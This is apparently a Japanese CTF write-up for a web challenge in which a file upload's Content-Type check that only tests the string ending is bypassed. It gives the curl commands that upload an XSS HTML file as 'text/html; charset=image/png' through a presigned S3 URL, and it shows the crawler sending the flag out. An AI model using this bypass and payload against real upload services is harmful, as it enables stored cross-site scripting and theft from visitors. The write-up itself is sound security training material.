# Is the end safe?:Validation Bypass:50pts
Is Content-Type secure if the end matches?  

- [Target](https://dlp011tu1iwaw.cloudfront.net/)  

**source code**  

- [Web Application](https://drive.google.com/file/d/1cpftRxj350dw-mJQRIv9kZEyGXO5fp9a/view?usp=drive_link)  

※ If no announcement is made, all "Crawler" source codes are the same.  

[https://dlp011tu1iwaw.cloudfront.net/](https://dlp011tu1iwaw.cloudfront.net/)  

# Solution
URLとアプリケーションのソースが渡される。  
クローラは[Server Side Upload](../Server_Side_Upload)と同様なようだ。  
アクセスすると同様のファイルアップロードサイトのようだ。  
![site.png](site/site.png)  
アプリケーションの主要ソースは以下のようであった。  
```ts
~~~
server.post<{
  Body: {
    contentType: string;
    length: number;
  };
}>('/api/upload', async (request, reply) => {
  if (!request.body.contentType || !request.body.length) {
    return reply.code(400).send({ error: 'No file uploaded' });
  }

  if (request.body.length > 1024 * 1024 * 100) {
    return reply.code(400).send({ error: 'File too large' });
  }

  const contentTypeValidator = (contentType: string) => {
    if (contentType.endsWith('image/png')) return true;
    if (contentType.endsWith('image/jpeg')) return true;
    if (contentType.endsWith('image/jpg')) return true;
    return false;
  };

  if (!contentTypeValidator(request.body.contentType)) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }

  const filename = uuidv4();
  const s3 = new S3Client({});
  const command = new PutObjectCommand({
    Bucket: process.env.BUCKET_NAME,
    Key: `upload/${filename}`,
    ContentLength: request.body.length,
    ContentType: request.body.contentType,
  });

  const url = await getSignedUrl(s3, command, {
    expiresIn: 60 * 60 * 24,
    signableHeaders: new Set(['content-type', 'content-length']),
  });
  return reply.header('content-type', 'application/json').send({
    url,
    filename,
  });
});
~~~
```
`contentTypeValidator`で末尾が`'image/png'`、`'image/jpeg'`、`'image/jpg'`のどれかであるかを`endsWith`を用いてチェックしている。  
このバリデーションをバイパスする問題のようだ。  
[MDN](https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Content-Type)を見ると`text/html; charset=UTF-8`が真っ先に目に入る。  
`text/html; charset=image/png`としてやるとHTMLとして読み込めそうだ。  
末尾は`image/png`なので、バリデーションも突破できる。  
近年では`charset=UTF-7`にするXSSが使えなくなっているため、charsetが壊れていてもブラウザがよしなにやってくれそうである。  
アップロードするファイルはServer Side Uploadと同じ、XSSを含むHTMLを用いる。
```bash
$ curl -X POST -H 'Content-Type: application/json' -d '{"contentType":"text/html; charset=image/png","length":221}' --upload-file xs3.html 'https://dlp011tu1iwaw.cloudfront.net/api/upload'
{"url":"https://uploadbucket-5b1bc63390-4-1-upload.s3.ap-northeast-1.amazonaws.com/upload/4acfd6ad-3216-4be6-ac80-886a3249f16d?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAUPVKPCT4LTEG7VQV%2F20240329%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Date=20240329T043821Z&X-Amz-Expires=86400&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLW5vcnRoZWFzdC0xIkYwRAIgec%2BL2XRvekZf3ckqOadQubRL5bzVSrpJSGgDSWzbQIICIGO%2F8xRrE5so0FPRKVjlgLvcnX1m5JLMjSdWtonxiV1hKrsDCOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQARoMMzA4NTIxNDA3NzM2Igx%2BWaG3GbVKIrTd3nYqjwMqR4arvAkSqSe5obWsG%2F3fRFlDzowIkLCiEOnvBjaY%2BBfCCkeMSYBCrbd0QacasV%2BmupPyypluCgb7AstAwA2QNIlsYWnF%2BjbXEEwcMrhEMtYHRTA7%2FPMWqShqUJH8UEzpHOfIPcBAFaRb%2FwOZ9zwgRIZxJ%2B2EeT3sD65UHI5I01UMgpYV1TVSX3wXWm48%2Bu%2FbdWEOngbPJd%2BEAtt9Ls2eo3NFmCFf%2BRmwh5fIPQYC15JLPZ56B5mV3x2zkEoLFE%2FXq0eGynlNJi6zN%2B74gf2M6%2FC4L2lIaV9g7m%2F%2BH54ai%2BQGDIOT1fNZPHL%2F3f7pQXtRs42SQCve%2FrSCim%2BhIavStwhsMS743AR88kXQA6LZ7g%2BGA%2BO4rH%2BaGaZUW51jLjHTSECY34Qg2c8Ubf9NWfmjd8lN0%2Bu64ztyDq9T7MLmwv6IAADG6eI1axMEx4aHfDbZUVsRHRKm%2Bs%2FoLpZhSJm7k%2FVDTVuPlAtT8CKozhKQFi0PcNH1x81jvkQwYu7IqGt1trlnN7L9s5vbpDbpJfAwu4uZsAY6nwHzJNwnyeAow4QIX7xu5LEauy6gP21mzMnoebWJcMT4jarj1ZEgqb8V%2FzncDB6rZJ1pwgmRCAf7%2F9lzzX%2BRiGXMj%2FemNSNtiQuc8Ko%2FG5xyNm1RItb9AFlC8oflaP%2FTTLKulc4GdkpVIxjuvVqcuN%2F6eg1NzMzJymm5rUO6la4kE%2FNebMAziH4y6MItTuZ5jzGGiVAPSYDFJyNh13h9L6I%3D&X-Amz-Signature=5fd329243bd570110979a444acb6f27489571090344972b604f4dde6465c01bf&X-Amz-SignedHeaders=content-length%3Bcontent-type%3Bhost&x-id=PutObject","filename":"4acfd6ad-3216-4be6-ac80-886a3249f16d"}
$ curl -X PUT -H 'Content-Type: text/html; charset=image/png' --upload-file xs3.html 'https://uploadbucket-5b1bc63390-4-1-upload.s3.ap-northeast-1.amazonaws.com/upload/4acfd6ad-3216-4be6-ac80-886a3249f16d?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAUPVKPCT4LTEG7VQV%2F20240329%2Fap-northeast-1%2Fs3%2Faws4_request&X-Amz-Date=20240329T043821Z&X-Amz-Expires=86400&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaDmFwLW5vcnRoZWFzdC0xIkYwRAIgec%2BL2XRvekZf3ckqOadQubRL5bzVSrpJSGgDSWzbQIICIGO%2F8xRrE5so0FPRKVjlgLvcnX1m5JLMjSdWtonxiV1hKrsDCOb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQARoMMzA4NTIxNDA3NzM2Igx%2BWaG3GbVKIrTd3nYqjwMqR4arvAkSqSe5obWsG%2F3fRFlDzowIkLCiEOnvBjaY%2BBfCCkeMSYBCrbd0QacasV%2BmupPyypluCgb7AstAwA2QNIlsYWnF%2BjbXEEwcMrhEMtYHRTA7%2FPMWqShqUJH8UEzpHOfIPcBAFaRb%2FwOZ9zwgRIZxJ%2B2EeT3sD65UHI5I01UMgpYV1TVSX3wXWm48%2Bu%2FbdWEOngbPJd%2BEAtt9Ls2eo3NFmCFf%2BRmwh5fIPQYC15JLPZ56B5mV3x2zkEoLFE%2FXq0eGynlNJi6zN%2B74gf2M6%2FC4L2lIaV9g7m%2F%2BH54ai%2BQGDIOT1fNZPHL%2F3f7pQXtRs42SQCve%2FrSCim%2BhIavStwhsMS743AR88kXQA6LZ7g%2BGA%2BO4rH%2BaGaZUW51jLjHTSECY34Qg2c8Ubf9NWfmjd8lN0%2Bu64ztyDq9T7MLmwv6IAADG6eI1axMEx4aHfDbZUVsRHRKm%2Bs%2FoLpZhSJm7k%2FVDTVuPlAtT8CKozhKQFi0PcNH1x81jvkQwYu7IqGt1trlnN7L9s5vbpDbpJfAwu4uZsAY6nwHzJNwnyeAow4QIX7xu5LEauy6gP21mzMnoebWJcMT4jarj1ZEgqb8V%2FzncDB6rZJ1pwgmRCAf7%2F9lzzX%2BRiGXMj%2FemNSNtiQuc8Ko%2FG5xyNm1RItb9AFlC8oflaP%2FTTLKulc4GdkpVIxjuvVqcuN%2F6eg1NzMzJymm5rUO6la4kE%2FNebMAziH4y6MItTuZ5jzGGiVAPSYDFJyNh13h9L6I%3D&X-Amz-Signature=5fd329243bd570110979a444acb6f27489571090344972b604f4dde6465c01bf&X-Amz-SignedHeaders=content-length%3Bcontent-type%3Bhost&x-id=PutObject'
```
アップロードに成功したらファイル名から`https://dlp011tu1iwaw.cloudfront.net/upload/4acfd6ad-3216-4be6-ac80-886a3249f16d`とURLがわかるので、クローラに投げてやる。  
すると以下のリクエストが届く。  
```
GET
/?satoki=flag=flag{97ce55c30c8dc3a34cd73bbf3f49c2bb15a89617}
```
flagが得られた。  

## flag{97ce55c30c8dc3a34cd73bbf3f49c2bb15a89617}